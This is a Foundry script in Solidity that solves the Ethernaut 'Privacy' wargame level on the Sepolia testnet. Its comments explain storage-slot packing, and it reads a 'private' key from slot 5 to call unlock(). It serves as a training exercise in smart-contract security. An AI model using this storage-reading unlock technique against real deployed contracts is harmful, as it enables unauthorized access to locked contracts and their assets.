// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Privacy} from "../src/Privacy.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Privacy.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract PrivacySolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = (vm.envAddress("PRIVACY_INSTANCE"));

    /* Attack idea: Basically we need to get the value at data[2]
        In solidity the storage consist of 32bytes per slot
        If variables are smaller than 32 bytes it will be fit in same slot position
        Knowing this we can see that data[2] is in slot5
        - bool public locked = true; // slot 0 - 1 byte
        - uint256 public ID = block.timestamp; // slot 1 - 32 bytes (this is in the next slot it cant be in the same slot with bool)
        - uint8 private flattening = 10; // slot 2 - 1 byte
        - uint8 private denomination = 255; // slot 2 - 1 byte
        - uint16 private awkwardness = uint16(block.timestamp); // slot 2 - 2 bytes
        - bytes32[3] private data; // slot 5 - 96 bytes (3 * 32 bytes) // slot 3 data[0] // slot 4 data[1] // slot 5 data[2]

        So we can simply load the slot 5 and get the value of data[2] and then cast it to bytes16
    */

    function run() external {
        // get the value of data[2], we need to cast 5 to bytes32
        bytes32 slot5Value = vm.load(instance, bytes32(uint256(5)));
        bytes16 keyValue = bytes16(slot5Value);
        vm.startBroadcast(deployerPrivateKey);
        // Get the instance of the Privacy contract
        Privacy privacyInstance = Privacy(instance);        
        // call the unlock function with the key
        privacyInstance.unlock(keyValue);
        require(privacyInstance.locked() == false, "Unlock failed"	);
        console.log("Privacy contract unlocked");
        vm.stopBroadcast();
    }
}
